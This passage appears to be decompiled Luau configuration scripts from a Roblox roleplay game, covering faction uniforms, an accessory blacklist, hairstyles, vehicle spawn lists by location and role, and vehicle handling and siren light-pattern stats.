	ASPSUntrained = {
		["ASPS Polo"] = { { 6535699127, 6529661101, nil, { "ASPSBelt" }, true } },
	}, 
	CivilDefense = {
		Service = { { 3725878967, 3671907048, nil, { "CDHelmet" } } }, 
		["Emergency Management"] = { { 3725876499, 3671907048, nil, { "CDHelmet" } } }
	}, 
	AFIGroup = {
		Formal = { { 6356094107, 6356094445, nil, {
			["Formal Cap"] = { "AFICap2", "AFICombatWebbing2" }, 
			["No Hat"] = {"AFICombatWebbing2" }, 
		} } },
		["MP BDU"] = { { 6380716255, 6317172295, nil, {
			["Helmet"] = { "AFIHelmet", "AFICombatWebbing" }, 
			["Field Cap"] = {"AFICap", "AFICombatWebbing" }, 
			["No Hat"] = {"AFICombatWebbing" }, 
		} } },
		--	Formal = { { 6356094107, 6356094445, nil, { "AFICap2" , "AFICombatWebbing2"} } },
		BDU = { { 6317171833, 6317172295, nil, {
			["Helmet"] = { "AFIHelmet", "AFICombatWebbing" }, 
			["Field Cap"] = { "AFICap", "AFICombatWebbing" }, 
			["No Hat"] = { "AFICombatWebbing" } },		
		} } },

	VoltStaff = {
		Events = { { 5048416663, 3433850365, nil, nil, nil, true } }, 
		Staff = { { 104740077201159, 14909501372, nil, nil, nil, true } }
	}
};

database.uniforms.accesoryblacklist

-- Decompiled with the Synapse X Luau decompiler.

return {
	["4794183296"] = true, 
	["4793971886"] = true, 
	["4753195371"] = true, 
	["4735272012"] = true, 
	["4753153215"] = true, 
	["4240253936"] = true, 
	["4794173239"] = true, 
	["4793958453"] = true, 
	["4794344877"] = true, 
	["4793985219"] = true, 
	["4771555241"] = true, 
	["4753371200"] = true, 
	["4771536301"] = true, 
	["4753230230"] = true, 
	["4820468093"] = true, 
	["4820468847"] = true, 
	["4822353689"] = true, 
	["4837259850"] = true, 
	["4753194062"] = true, 
	["4735676088"] = true, 
	["4753437569"] = true, 
	["4820446498"] = true, 
	["4876763035"] = true, 
	["4771647994"] = true, 
	["4771646140"] = true, 
	["4771552459"] = true, 
	["4771592966"] = true, 
	["4820448812"] = true, 
	["4332375148"] = true, 
	["4435389917"] = true, 
	["4585144193"] = true, 
	["4506965901"] = true, 
	["4821679391"] = true, 
	["4821776975"] = true, 
	["4684079842"] = true, 
	["4753609886"] = true, 
	["4753609549"] = true, 
	["4753607871"] = true, 
	["4753610119"] = true, 
	["4735116238"] = true, 
	["4735123833"] = true, 
	["4735128068"] = true, 
	["4735119986"] = true, 
	["4735121738"] = true, 
	["4753608134"] = true, 
	["4753590705"] = true, 
	["4753606822"] = true, 
	["4753601040"] = true, 
	["4753593217"] = true, 
	["4753586470"] = true, 
	["4962552589"] = true, 
	["5028584774"] = true, 
	["5028575290"] = true, 
	["5861465755"] = true, 
	["5833489124"] = true, 
	["5028580729"] = true, 
	["4962394040"] = true, 
	["5802095741"] = true, 
	["4963888772"] = true, 
	["5029101168"] = true, 
	["5029099961"] = true, 
	["5029051489"] = true, 
	["4820447344"] = true, 
	["5063549346"] = true
};


uniforms.hairstyles
local HairStyles = {
	[1] = {Name = "None"},
	[2] = {Name = "Trecky", Accessory = "Trecky"},
	[3] = {Name = "Bun", Accessory = "Bun"},
	[4] = {Name = "Long", Accessory = "Long"}
}
return HairStyles

uniforms.mainmodule

-- Decompiled with the Synapse X Luau decompiler.

return {
	["4794183296"] = true, 
	["4793971886"] = true, 
	["4753195371"] = true, 
	["4735272012"] = true, 
	["4753153215"] = true, 
	["4240253936"] = true, 
	["4794173239"] = true, 
	["4793958453"] = true, 
	["4794344877"] = true, 
	["4793985219"] = true, 
	["4771555241"] = true, 
	["4753371200"] = true, 
	["4771536301"] = true, 
	["4753230230"] = true, 
	["4820468093"] = true, 
	["4820468847"] = true, 
	["4822353689"] = true, 
	["4837259850"] = true, 
	["4753194062"] = true, 
	["4735676088"] = true, 
	["4753437569"] = true, 
	["4820446498"] = true, 
	["4876763035"] = true, 
	["4771647994"] = true, 
	["4771646140"] = true, 
	["4771552459"] = true, 
	["4771592966"] = true, 
	["4820448812"] = true, 
	["4332375148"] = true, 
	["4435389917"] = true, 
	["4585144193"] = true, 
	["4506965901"] = true, 
	["4821679391"] = true, 
	["4821776975"] = true, 
	["4684079842"] = true, 
	["4753609886"] = true, 
	["4753609549"] = true, 
	["4753607871"] = true, 
	["4753610119"] = true, 
	["4735116238"] = true, 
	["4735123833"] = true, 
	["4735128068"] = true, 
	["4735119986"] = true, 
	["4735121738"] = true, 
	["4753608134"] = true, 
	["4753590705"] = true, 
	["4753606822"] = true, 
	["4753601040"] = true, 
	["4753593217"] = true, 
	["4753586470"] = true, 
	["4962552589"] = true, 
	["5028584774"] = true, 
	["5028575290"] = true, 
	["5861465755"] = true, 
	["5833489124"] = true, 
	["5028580729"] = true, 
	["4962394040"] = true, 
	["5802095741"] = true, 
	["4963888772"] = true, 
	["5029101168"] = true, 
	["5029099961"] = true, 
	["5029051489"] = true, 
	["4820447344"] = true, 
	["5063549346"] = true
};


database.vehiclespawns
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {};
local v2 = { "Conveyor", "Chariot", "ChariotIntrepid", "ChariotExplorer", "ChariotUtility", "ElDorado", "StretchCrusader", "Jackal", "TaxiJackal", "ElDorado4x4", "TrailDestroyer", "Hankmobile", "DevConveyor", "Crusader", "CabCrusader", "CrusaderC", "CabCrusaderC", "Carpathian", "McDoogleCrusader", "McDoogleCart", "GolfCart" , "RacerCrusader"};
local v3 = {"RCSOCrusaderV2","RCSOCrusaderV1","TPOCrusader","CHPCrusader","BRITCrusader","TACOTRUCK", "PWIntrepidLEO","PWJackalLEO","LPDCrusaderS","SheriffUtility","NGUtility","MSPChariot","UnmarkedTaxiJackal","PPDConveyor","UnmarkedJackalS","PPDCrusaderCS","PPDCrusaderS","SheriffCrusaderS","SheriffConveyor", "PPDElDorado", "SheriffChariot", "PPDElDoradoSup", "SheriffChariotSup", "PPDJackal", "MSPJackal", "LPDJackal", "NGElDorado4x4", "DevConveyor", "SheriffJackal", "PWIntrepid", "UnmarkedJackal", "Hankmobile", "NGCrusader", "NGCrusaderMP", "MSPCrusader", "MSPCrusaderS", "LPDCrusader", "PPDCrusader", "SheriffCrusader", "SheriffCrusaderCS", "UnmarkedCrusader", "UnmarkedCrusaderC", "PPDCrusaderC", "SheriffCrusaderC", "LPDCrusaderCS", "LPDCrusaderC", "LPDCrusaderC", "MSPCrusaderC", "MSPCrusaderCS", "SheriffCrusaderC", "PWJackal", "NGCrusaderC", "NGCrusaderCMP", "MSPUtility", "LPDUtility", "RacerCrusader" };
v1._Default = {
	Vehicles = v2
};
v1.LanderDealership = {
	Vehicles = v2
};
v1.ASPSSpawn = {
	Role = "ASPSGroup", 
	Vehicles = v2
};
v1.PlymouthDealership = {
	Vehicles = v2
};
v1.WestPointDealership = {
	Vehicles = v2
};
v1.LanderDealership = {
	Vehicles = v2
};
v1.AFISSpawn = {
	Vehicles = v2
};
v1.SOCiviSpawn = {
	Vehicles = v2
};
v1.NationalGuardCivi = {
	Vehicles = v2
};
v1.PrisonSpawn = {
	Role = "SheriffGroup", 
	Vehicles = v3
};
v1.SOSpawn = {
	Role = "SheriffGroup", 
	Vehicles = v3
};
v1.LPDSpawn = {
	Role = "LPDGroup", 
	Vehicles = v3
};
v1.WPSOSubStation = {
	Role = "SheriffGroup", 
	Vehicles = v3
};
v1.MSPHQSpawn = {
	Role = "MSPGroup", 
	Vehicles = v3
};
v1.PPDSpawn = {
	Role = "PPDGroup", 
	Vehicles = v3
};
v1.MSPSpawn = {
	Role = "MSPGroup", 
	Vehicles = v3
};
v1.NationalGuard = {
	Role = "MNGGroup", 
	Vehicles = v3
};
v1.NationalGuard1 = {
	Role = "MNGGroup", 
	Vehicles = v3
};
v1.NationalGuard2 = {
	Role = "MNGGroup", 
	Vehicles = v3
};
v1.NationalGuard3 = {
	Role = "MNGGroup", 
	Vehicles = v3
};
v1.ParksWild = {
	Role = "PWGroup", 
	Vehicles = v3
};
v1.FireDepartment = {
	Role = "FireDepGroup", 
	Vehicles = { "NHTALandCrawlerTD","NHTALandCrawlerDD","FireBoxAmbulance", "FireAmbulance", "FireElDorado", "FireTruck", "UnmarkedCrusader" }
};
v1.NHCTASpawn = {
	Role = "NHTAGroup", 
	Vehicles = { "NHTALandCrawlerDD","NHTALandCrawler", "NHTAUtility", 'NHTALandCrawlerTD' }
};
v1.PBSSpawn = {
	Role = "PBSGroup", 
	Vehicles = { "PBSConveyor" }
};
if game.PlaceId == 993383085 then
	print("[VehicleSpawns] Configuring LETI VehicleSpawns");
	local v4 = { "PBSConveyor", "NHTALandCrawler", "NHTAUtility", "FireBoxAmbulance", "FireAmbulance", "FireElDorado", "FireTruck" };
	for v5, v6 in pairs(v3) do
		table.insert(v4, v6);
	end;
	for v7, v8 in pairs(v2) do
		table.insert(v4, v8);
	end;
	v1.InstituteSpawn = {
		Vehicles = v4
	};
end;
return v1;

database.vehicles
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {};
local function v2(p1, p2)
	local v3 = nil;
	local v4 = nil;
	if type(p1) == "table" then
		v4 = {};
		for v5, v6 in pairs(p1) do
			v4[v5] = v6;
		end;
		if not p2 then
			v3 = v4;
			return v3;
		end;
	else
		v4 = p1;
		v3 = v4;
		return v3;
	end;
	for v7, v8 in pairs(p2) do
		if v7:sub(1, 1) == "_" then
			v4[v7:sub(2)] = nil;
		else
			v4[v7] = v8;
		end;
	end;
	return v4;
end;
local v9 = {
	MaxTorque = math.huge, 
	AngularSpeed = 2.5, 
	TargetAngle = 40
};
local v10 = { { "WE", "RE", "RE2" }, { { { { "RE2" }, {}, 0.4 }, { {}, { "RE2" }, 0.4 } }, { { { "WE" }, { "RE" }, 0.3 }, { { "RE" }, { "WE" }, 0.3 } } } };
local v11 = { { "BE", "RE", "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "BE", "LED1:!BE", "LED2:!BE", "LED3:!BE" }, { "RE", "LED4", "LED5", "LED6" }, 0.3 }, { { "RE", "LED4:!RE", "LED5:!RE", "LED6:!RE" }, { "BE", "LED1", "LED2", "LED3" }, 0.3 } } } };
local trolling = { { "WE", "RE", "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "WE", "LED1:!WE", "LED2:!WE", "LED3:!WE" }, { "RE", "LED4", "LED5", "LED6" }, 0.3 }, { { "RE", "LED4:!RE", "LED5:!RE", "LED6:!RE" }, { "WE", "LED1", "LED2", "LED3" }, 0.3 } } } };
local v88 = { { "WE", "RE", "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "BE", "LED1:!WE", "LED2:!WE", "LED3:!WE" }, { "RE", "LED4", "LED5", "LED6" }, 0.3 }, { { "RE", "LED4:!RE", "LED5:!RE", "LED6:!RE" }, { "WE", "LED1", "LED2", "LED3" }, 0.3 } } } };
local v25 = { { "GOE", "TOE" }, { { { { "GOE" }, { "TOE" }, 0.3 }, { { "TOE" }, { "GOE" }, 0.3 } } } };
local v12 = { { "BE", "RE", "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "BE", "LED2:!BE", "LED4:!BE", "LED6:!BE" }, { "RE", "LED1", "LED3", "LED5" }, 0.3 }, { { "RE", "LED1:!RE", "LED3:!RE", "LED5:!RE" }, { "BE", "LED2", "LED4", "LED6" }, 0.3 } } } };
local v13 = { {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "LED6:!OE" }, {}, 0.25 }, { { "LED6:!OE", "LED5:!OE" }, {}, 0.25 }, { { "LED6:!OE", "LED5:!OE", "LED4:!OE" }, {}, 0.25 }, { { "LED6:!OE", "LED5:!OE", "LED4:!OE", "LED3:!OE" }, {}, 0.25 }, { { "LED6:!OE", "LED5:!OE", "LED4:!OE", "LED3:!OE", "LED2:!OE" }, {}, 0.25 }, { { "LED6:!OE", "LED5:!OE", "LED4:!OE", "LED3:!OE", "LED2:!OE", "LED1:!OE" }, {}, 0.25 }, { {}, { "LED6", "LED5", "LED4", "LED3", "LED2", "LED1" }, 0.25 } } }
}, {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "LED1:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE", "LED4:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE", "LED4:!OE", "LED5:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE", "LED4:!OE", "LED5:!OE", "LED6:!OE" }, {}, 0.25 }, { {}, { "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, 0.25 } } }
}, {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5", "LED6" }, { { { { "LED3:!OE", "LED4:!OE" }, {}, 0.3 }, { { "LED3:!OE", "LED4:!OE", "LED2:!OE", "LED5:!OE" }, {}, 0.3 }, { { "LED3:!OE", "LED4:!OE", "LED2:!OE", "LED5:!OE", "LED1:!OE", "LED6:!OE" }, {}, 0.3 }, { {}, { "LED3", "LED4", "LED2", "LED5", "LED1", "LED6" }, 0.3 } } }
} };
local v14 = { {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "LED5:!OE" }, {}, 0.25 }, { { "LED5:!OE", "LED4:!OE" }, {}, 0.25 }, { { "LED5:!OE", "LED4:!OE", "LED3:!OE" }, {}, 0.25 }, { { "LED5:!OE", "LED4:!OE", "LED3:!OE", "LED2:!OE" }, {}, 0.25 }, { { "LED5:!OE", "LED4:!OE", "LED3:!OE", "LED2:!OE", "LED1:!OE" }, {}, 0.25 }, { {}, { "LED5", "LED4", "LED3", "LED2", "LED1" }, 0.25 } } }
}, {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "LED1:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE", "LED4:!OE" }, {}, 0.25 }, { { "LED1:!OE", "LED2:!OE", "LED3:!OE", "LED4:!OE", "LED5:!OE" }, {}, 0.25 }, { {}, { "LED1", "LED2", "LED3", "LED4", "LED5" }, 0.25 } } }
}, {
	Priority = 2,
	{ "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "LED3:!OE" }, {}, 0.3 }, { { "LED3:!OE", "LED2:!OE", "LED4:!OE" }, {}, 0.3 }, { { "LED3:!OE", "LED2:!OE", "LED4:!OE", "LED5:!OE", "LED1:!OE" }, {}, 0.3 }, { {}, { "LED3", "LED4", "LED2", "LED5", "LED1" }, 0.3 } } }
} };
local v15 = { { v11 }, v13 };
local swag = { { trolling }, v13 };
local v16 = { { v12 }, v13 };
local v17 = { { v11 }, v14 };
local v18 = { { v12 }, v14 };
local v19 = { { "WE", "RE", "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "WE", "LED2:!RE", "LED4:!RE" }, { "RE", "LED1", "LED3", "LED5" }, 0.3 }, { { "RE", "LED1:!WE", "LED3:!WE", "LED5:!WE" }, { "WE", "LED2", "LED4" }, 0.3 } } } };
local v99 = { { v88 }, v13 };
local v20 = { { "WE", "OE" }, { { { { "WE" }, { "OE" }, 0.3 }, { { "OE" }, { "WE" }, 0.3 } } } };
local v21 = { { "WE", "RE", "OE", "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "RE", "LED1:!RE", "LED5:!RE" }, { "WE", "LED2", "LED3", "LED4", "OE" }, 0.2 }, { { "WE", "OE", "LED3:!OE", "LED2:!WE", "LED4:!WE" }, { "RE", "LED1", "LED5" }, 0.2 }, { { "OE", "LED3:!OE" }, { "WE", "RE", "LED2", "LED4" }, 0.2 } } } };
local v22 = {
	Lower = 0.6, 
	Upper = 1.8, 
	Damping = 9500, 
	FreeLength = 1.2, 
	MaxForce = 400000, 
	Stiffness = 90000
};
local v23 = {
	Lower = 0.5, 
	Upper = 1.8, 
	Damping = 10000, 
	FreeLength = 1.2, 
	MaxForce = 400000, 
	Stiffness = 85000
};
v1.LPDJackal = {
	Name = "LPD Jackalope", 
	Asset = "LPDJackal", 
	MaxHealth = 1100, 
	GasTank = 800, 
	InventorySize = 110, 
	Sirens = true, 
	Inventory = { { "PoliceBarrier", 2 }, { "Cone", 6 }, { "RadarGun", 1 }, { "Jerrycan", 1 } }, 
	AcceIeration = 8.5, 
	Torque = 130000, 
	Gears = { -15, 0, 30, 50, 70, 90, 110 }, 
	Drive = "AWD", 
	Weight = 510, 
	Suspension = v23, 
	BrakeAcceIeration = 16, 
	Steering = v9, 
	LightPatterns = { { v19 }, v14 }, 
	Directors = true
};
v1.TACOTRUCK = {
	Name = "TACOTRUCK", 
	Asset = "TACOTRUCK", 
	MaxHealth = 1600, 
	GasTank = 1500, 
	InventorySize = 160, 
	AcceIeration = 8.5, 
	Torque = 145000, 
	Gears = { -15, 0, 20, 40, 60, 70, 120 }, 
	Drive = "RWD", 
	Weight = 620, 
	Suspension = {
		Lower = 0.8, 
		Upper = 1.7, 
		Damping = 14000, 
		FreeLength = 1.3, 
		MaxForce = 400000, 
		Stiffness = 130000
	}, 
	BrakeAcceIeration = 12, 
	Sirens = true, 
	Steering = v9
};
v1.PPDJackal = v2(v1.LPDJackal, {
	Name = "PPD Jackalope", 
	Asset = "PPDJackal", 
	LightPatterns = v16
});
v1.MSPJackal = v2(v1.PPDJackal, {
	Name = "DSP Jackalope", 
	Asset = "MSPJackal"
});
v1.SheriffJackal = v2(v1.PPDJackal, {
	Name = "Sheriff Jackalope", 
	Asset = "SheriffJackal"
});
v1.UnmarkedJackal = v2(v1.PPDJackal, {
	Name = "Unmarked Jackalope", 
	Asset = "UnmarkedJackal", 
	Color = BrickColor.new("Black"), 
	Paintable = true, 
	LightPatterns = v15
});
v1.UnmarkedTaxiJackal = v2(v1.PPDJackal, {
	Name = "Unmarked Taxi Jackalope", 
	Asset = "UnmarkedTaxiJackal", 
	Color = BrickColor.new("Gold"), 
	Paintable = false,
	LightPatterns = v15
});
v1.UnmarkedJackalS = v2(v1.PPDJackal, {
	Name = "Unmarked Jackalope S", 
	Asset = "UnmarkedJackalS", 
	Color = BrickColor.new("Black"), 
	Paintable = true, 
	LightPatterns = v15
});
v1.PWJackal = v2(v1.PPDJackal, {
	Name = "Wildlife Jackalope", 
	Asset = "PWJackal", 
	Inventory = { { "PWBarrier", 4 }, { "Cone", 8 }, { "Jerrycan", 4 } }, 
	LightPatterns = { { v19 }, v14 }
});
v1.PWJackalLEO = v2(v1.PPDJackal, {
	Name = "Ranger Jackalope", 
	Asset = "PWJackalLEO", 
	Inventory = { { "PWBarrier", 4 }, { "Cone", 8 }, { "Jerrycan", 4 } }, 
	LightPatterns = v18
});
v1.NHTALandCrawler = {
	Name = "Land Crawler", 
	Asset = "NHTALandCrawler", 
	MaxHealth = 900, 
	GasTank = 2300, 
	InventorySize = 0, 
	AcceIeration = 5, 
	Torque = 140000, 
	Gears = { -15, 0, 20, 30, 50, 70, 80 }, 
	Drive = "AWD", 
	Weight = 900, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.4, 
		Damping = 15000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 150000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.NHTALandCrawlerDD = {
	Name = "Land Crawler DD", 
	Asset = "NHTALandCrawlerDD", 
	MaxHealth = 900, 
	GasTank = 2300, 
	InventorySize = 0, 
	AcceIeration = 5.5, 
	Torque = 140000, 
	Gears = { -15, 0, 20, 30, 50, 70, 80 }, 
	Drive = "AWD", 
	Weight = 900, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.4, 
		Damping = 15000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 150000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.NHTALandCrawlerTD = {
	Name = "Land Crawler TD", 
	Asset = "NHTALandCrawlerTD", 
	MaxHealth = 900, 
	GasTank = 2300, 
	InventorySize = 0, 
	AcceIeration = 5.5, 
	Torque = 140000, 
	Gears = { -15, 0, 20, 30, 50, 70, 80 }, 
	Drive = "AWD", 
	Weight = 900, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.4, 
		Damping = 15000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 150000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.Jackal = {
	Name = "Jackalope", 
	Asset = "Jackal", 
	MaxHealth = 1000, 
	GasTank = 800, 
	InventorySize = 100, 
	Paintable = true, 
	AcceIeration = 8, 
	Torque = 120000, 
	Gears = { -15, 0, 30, 50, 70, 90, 100 }, 
	Drive = "AWD", 
	Weight = 500, 
	Suspension = v23, 
	BrakeAcceIeration = 15, 
	Steering = v9
};
v1.TaxiJackal = v2(v1.Jackal, {
	Name = "Jackalope Taxi", 
	Asset = "TaxiJackal", 
	_Paintable = true
});
v1.SheriffChariot = {
	Name = "Sheriff Chariot", 
	Asset = "SheriffChariot", 
	MaxHealth = 925, 
	GasTank = 750, 
	InventorySize = 160, 
	Sirens = true, 
	Inventory = { { "PoliceBarrier", 3 }, { "Cone", 5 }, { "Jerrycan", 1 }, { "RadarGun", 1 } }, 
	AcceIeration = 8.25, 
	Torque = 150000, 
	Gears = { -15, 0, 30, 50, 70, 90, 110 }, 
	Drive = "RWD", 
	Weight = 550, 
	Suspension = v22, 
	BrakeAcceIeration = 18, 
	Steering = v9, 
	LightPatterns = { { v11 } }
};
v1.SheriffChariotSup = v2(v1.SheriffChariot, {
	Name = "Sheriff Chariot S", 
	Asset = "SheriffChariotSup"
});
v1.MSPChariot = v2(v1.SheriffChariot, {
	Name = "DSP Chariot", 
	Asset = "MSPChariot"
});
v1.PWIntrepid = v2(v1.SheriffChariot, {
	Name = "Wildlife Intrepid", 
	Asset = "PWIntrepid", 
	Inventory = { { "Jerrycan", 4 } }, 
	LightPatterns = { { v19 } }
});
v1.PWIntrepidLEO = v2(v1.SheriffChariot, {
	Name = "Ranger Intrepid", 
	Asset = "PWIntrepidLEO", 
	Inventory = { { "Jerrycan", 4 } }, 
});
v1.Chariot = {
	Name = "Chariot", 
	Asset = "Chariot", 
	MaxHealth = 750, 
	GasTank = 1000, 
	InventorySize = 160, 
	Paintable = true, 
	AcceIeration = 7.5, 
	Torque = 145000, 
	Gears = { -15, 0, 30, 50, 60, 70, 80 }, 
	Drive = "RWD", 
	Weight = 520, 
	Suspension = v22, 
	BrakeAcceIeration = 17, 
	Steering = v9
};
v1.ChariotIntrepid = {
	Name = "Chariot Intrepid", 
	Asset = "ChariotIntrepid", 
	MaxHealth = 750, 
	GasTank = 1000, 
	InventorySize = 160, 
	Paintable = true, 
	AcceIeration = 7.5, 
	Torque = 145000, 
	Gears = { -15, 0, 30, 50, 60, 70, 80 }, 
	Drive = "RWD", 
	Weight = 550, 
	Suspension = v22, 
	BrakeAcceIeration = 17, 
	Steering = v9
};
v1.ChariotExplorer = {
	Name = "Chariot Explorer", 
	Asset = "ChariotExplorer", 
	MaxHealth = 800, 
	GasTank = 1000, 
	InventorySize = 170, 
	Paintable = true, 
	AcceIeration = 7, 
	Torque = 145000, 
	Gears = { -15, 0, 30, 50, 60, 70, 80 }, 
	Drive = "RWD", 
	Weight = 550, 
	Suspension = v22, 
	BrakeAcceIeration = 16, 
	Steering = v9
};
v1.ChariotUtility = {
	Name = "Chariot Utility", 
	Asset = "ChariotUtility", 
	MaxHealth = 850, 
	GasTank = 1000, 
	InventorySize = 180, 
	Paintable = true, 
	AcceIeration = 6.5, 
	Torque = 145000, 
	Gears = { -15, 0, 20, 40, 50, 70, 80 }, 
	Drive = "RWD", 
	Weight = 580, 
	Suspension = v22, 
	BrakeAcceIeration = 14, 
	Steering = v9
};
v1.NHTAUtility = v2(v1.ChariotUtility, {
	Name = "NHTA Utility", 
	Asset = "NHTAUtility", 
	LightPatterns = { { v20 } }, 
	Inventory = { { "Cone", 4 }, { "Jerrycan", 2 } }, 
	Sirens = true
});
v1.MSPUtility = v2({
	Name = "DSP Utility", 
	Asset = "MSPUtility", 
	MaxHealth = 1400, 
	GasTank = 1100, 
	InventorySize = 200, 
	Paintable = true, 
	Sirens = true, 
	Inventory = { { "PoliceBarrier", 4 }, { "Cone", 12 }, { "Jerrycan", 2 } }, 
	AcceIeration = 7, 
	Torque = 145000, 
	Gears = { -15, 0, 20, 40, 50, 70, 90 }, 
	Drive = "RWD", 
	Weight = 600, 
	Suspension = v22, 
	BrakeAcceIeration = 14, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = v18
});
v1.SheriffUtility = v2({
	Name = "Sheriff Utility", 
	Asset = "SheriffUtility", 
	MaxHealth = 1400, 
	GasTank = 1100, 
	InventorySize = 200, 
	Paintable = true, 
	Sirens = true, 
	Inventory = { { "PoliceBarrier", 4 }, { "Cone", 12 }, { "Jerrycan", 2 } }, 
	AcceIeration = 7, 
	Torque = 145000, 
	Gears = { -15, 0, 20, 40, 50, 70, 90 }, 
	Drive = "RWD", 
	Weight = 600, 
	Suspension = v22, 
	BrakeAcceIeration = 14, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = v18
});
v1.LPDUtility = v2(v1.MSPUtility, {
	Name = "LPD Utility", 
	Asset = "LPDUtility", 
	LightPatterns = { { v19 }, v14 }
});
v1.NGUtility = v2(v1.MSPUtility, {
	Name = "NG Utility", 
	Asset = "NGUtility", 
	_LightPatterns = true,
	Inventory = { { "NGBarrier", 4 }, { "Cone", 12 }, { "Jerrycan", 2 } }, 
});
v1.TrailDestroyer = {
	Name = "Trail Destroyer", 
	Asset = "TrailDestroyer", 
	MaxHealth = 600, 
	GasTank = 1500, 
	InventorySize = 160, 
	AcceIeration = 5.5, 
	Torque = 145000, 
	Gears = { -15, 0, 20, 40, 50, 60, 70 }, 
	Drive = "RWD", 
	Weight = 620, 
	Suspension = {
		Lower = 0.8, 
		Upper = 1.7, 
		Damping = 14000, 
		FreeLength = 1.3, 
		MaxForce = 400000, 
		Stiffness = 130000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.Conveyor = {
	Name = "Conveyor", 
	Asset = "Conveyor", 
	MaxHealth = 800, 
	GasTank = 1150, 
	InventorySize = 260, 
	Paintable = true, 
	AcceIeration = 5.5, 
	Torque = 155000, 
	Gears = { -15, 0, 20, 40, 50, 60, 70 }, 
	Drive = "RWD", 
	Weight = 680, 
	Suspension = {
		Lower = 0.3, 
		Upper = 1.6, 
		Damping = 10000, 
		FreeLength = 0.7, 
		MaxForce = 400000, 
		Stiffness = 105000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.PBSConveyor = {
	Name = "PBS Conveyor", 
	Asset = "PBSConveyor", 
	MaxHealth = 800, 
	GasTank = 1200, 
	InventorySize = 180, 
	AcceIeration = 6, 
	Torque = 159000, 
	Gears = { -15, 0, 20, 30, 50, 70, 80 }, 
	Drive = "RWD", 
	Weight = 700, 
	Suspension = v1.Conveyor.Suspension, 
	BrakeAcceIeration = 12, 
	Steering = v9
};
v1.SheriffConveyor = {
	Name = "Sheriff Conveyor", 
	Asset = "SheriffConveyor", 
	MaxHealth = 900, 
	GasTank = 1200, 
	InventorySize = 240, 
	Sirens = true, 
	Inventory = { { "Jerrycan", 1 } }, 
	AcceIeration = 6.5, 
	Torque = 160000, 
	Gears = { -15, 0, 20, 40, 50, 60, 80 }, 
	Drive = "RWD", 
	Weight = 700, 
	Suspension = v1.Conveyor.Suspension, 
	BrakeAcceIeration = 12, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = v18
};
v1.PPDConveyor = {
	Name = "PPD Conveyor", 
	Asset = "PPDConveyor", 
	MaxHealth = 900, 
	GasTank = 1200, 
	InventorySize = 240, 
	Sirens = true, 
	Inventory = { { "Jerrycan", 1 } }, 
	AcceIeration = 6.5, 
	Torque = 160000, 
	Gears = { -15, 0, 20, 40, 50, 60, 80 }, 
	Drive = "RWD", 
	Weight = 700, 
	Suspension = v1.Conveyor.Suspension, 
	BrakeAcceIeration = 12, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = v18
};
v1.DevConveyor = {
	Name = "Dev Conveyor", 
	Asset = "DevConveyor", 
	MaxHealth = 900, 
	GasTank = 1200, 
	InventorySize = 240, 
	Sirens = true, 
	Inventory = { { "Cone", 8 }, { "Jerrycan", 1 } }, 
	AcceIeration = 7, 
	Torque = v1.SheriffConveyor.Torque, 
	Gears = v1.SheriffConveyor.Gears, 
	Drive = "RWD", 
	Weight = 700, 
	Suspension = v1.Conveyor.Suspension, 
	BrakeAcceIeration = 12, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = { { { { "WE", "OE", "LED1", "LED2", "LED3", "LED4", "LED5" }, { { { { "WE", "LED2:!WE", "LED4:!WE" }, { "OE", "LED1", "LED3", "LED5" }, 0.3 }, { { "OE", "LED1:!OE", "LED3:!OE", "LED5:!OE" }, { "WE", "LED2", "LED4" }, 0.3 } } } } }, v14 }
};
v1.ElDorado = {
	Name = "ElDorado", 
	Asset = "ElDorado", 
	MaxHealth = 850, 
	GasTank = 1000, 
	InventorySize = 130, 
	Paintable = true, 
	AcceIeration = 7.25, 
	Torque = 145000, 
	Gears = { -15, 0, 30, 50, 70, 80, 90 }, 
	Drive = "AWD", 
	Weight = 550, 
	Suspension = {
		Lower = 0.6, 
		Upper = 1.8, 
		Damping = 8000, 
		FreeLength = 1.2, 
		MaxForce = 400000, 
		Stiffness = 80000
	}, 
